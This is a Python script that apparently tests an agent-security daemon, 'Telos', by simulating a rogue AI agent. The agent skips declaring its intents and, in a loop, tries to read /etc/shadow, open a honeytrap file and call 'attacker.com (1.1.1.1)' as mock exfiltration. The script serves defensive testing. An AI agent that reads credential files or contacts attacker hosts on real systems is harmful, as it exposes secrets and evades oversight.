import time
import urllib.request
import os
import sys

# Add the parent directory to Python path to allow cortex import
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from cortex.unix_socket import CoreIPCClient

print("[*] Starting Rogue Telos Agent Simulation...")

# 1. Connect to IPC and Register
ipc = CoreIPCClient()
if not ipc.connect():
    print("Failed to connect to Telos IPC. Is the daemon running?")
    sys.exit(1)

pid = os.getpid()
print(f"[*] Registering rogue agent (PID: {pid}) with Telos Core...")
ipc.send_register_agent(pid, "rogue_agent")

time.sleep(1)

print("[*] Attempting actions WITHOUT declaring intents (Zero-Trust Violation)...")

for i in range(1, 10):
    try:
        print(f"\n[{i}] Attempting to read /etc/shadow...")
        with open("/etc/shadow", "r") as f:
            f.read()
            print("SUCCESS (Wait, this shouldn't happen!)")
    except Exception as e:
        print(f"BLOCKED reading /etc/shadow: {e}")
        
    try:
        print(f"[{i}] Attempting to trip Mirage honeytrap (/tmp/secret.txt)...")
        with open("/tmp/secret.txt", "r") as f:
            f.read()
            print("SUCCESS")
    except Exception as e:
        print(f"BLOCKED reading honeytrap: {e}")

    try:
        print(f"[{i}] Attempting network exfiltration to attacker.com (1.1.1.1)...")
        urllib.request.urlopen("http://1.1.1.1", timeout=1)
        print("SUCCESS")
    except Exception as e:
        print(f"BLOCKED network: {e}")
        
    time.sleep(2)

print("[*] Attack simulation complete.")
